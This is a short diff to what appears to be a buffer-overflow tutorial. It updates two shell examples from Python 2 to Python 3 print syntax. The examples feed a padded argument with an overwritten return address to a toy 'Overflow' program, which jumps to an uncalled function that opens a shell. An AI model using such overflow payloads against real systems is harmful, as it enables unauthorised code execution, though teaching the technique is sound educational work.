@@ -380,9 +380,9 @@ An example scenario would be something like this.
 The function which is never actually called, is printing something and opening the shell:
 
 ```shell
-# ./Overflow $(python -c 'print "A" * 10')
+# ./Overflow $(python -c 'print("A" * 10)')
 AAAAAAAAAA
-# ./Overflow $(python -c 'print "A" * 20 + "\x11\x11\x11\x11"')
+# ./Overflow $(python -c 'print("A" * 20 + "\x11\x11\x11\x11")')
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGUUUUAccidental shell access appeared
 # exit
 exit
